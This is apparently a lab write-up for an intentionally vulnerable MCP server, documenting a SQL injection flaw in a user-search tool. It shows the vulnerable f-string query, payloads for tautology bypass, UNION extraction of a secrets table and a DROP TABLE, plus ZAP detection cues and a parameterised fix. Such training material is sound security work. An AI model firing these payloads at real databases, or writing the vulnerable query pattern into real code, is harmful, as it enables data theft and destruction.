# SQL Injection — CWE-89

## Description

User input is concatenated directly into an SQL query string without parameterisation.
This allows an attacker to alter the query's logic, bypass filters, or exfiltrate data
from any table in the database.

## Vulnerable Code

```python
# tools/sqli.py
query = f"SELECT id, name, email, role FROM users WHERE name = '{name}'"
db.execute(query)
```

The `name` parameter is interpolated into the SQL string. No escaping or parameterisation is applied.

## Example MCP Call (benign)

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "search_users",
    "arguments": {"name": "alice"}
  },
  "id": 1
}
```

## Attack Payloads

### Return all users (tautology bypass)
```
' OR '1'='1
```
Resulting query: `SELECT ... WHERE name = '' OR '1'='1'`

### Error-based probe (confirm injection)
```
'
```
Returns: `Database error: unrecognised token: "'"` — confirms injection point.

### UNION-based exfiltration (dump secrets table)
```
' UNION SELECT id,label,value,label FROM secrets--
```
Returns rows from the `secrets` table including AWS keys and the JWT secret.

### Drop table (destructive)
```
'; DROP TABLE users;--
```

## Expected Response (bypass payload)

```
(1, 'alice', 'alice@evmcp.local', 'user')
(2, 'bob', 'bob@evmcp.local', 'user')
(3, 'carol', 'carol@evmcp.local', 'user')
(4, 'admin', 'admin@evmcp.local', 'admin')
(5, 'dbsvc', 'db@evmcp.local', 'svc')
```

## ZAP Detection

ZAP's SQL Injection active scanner should detect:
- Error-based: response contains `sqlite3.OperationalError` or `unrecognised token`
- Boolean-based: different row counts for `' OR '1'='1` vs `' AND '1'='2`

## Secure Fix

Use parameterised queries:

```python
cur = db.execute(
    "SELECT id, name, email, role FROM users WHERE name = ?",
    (name,),
)
```
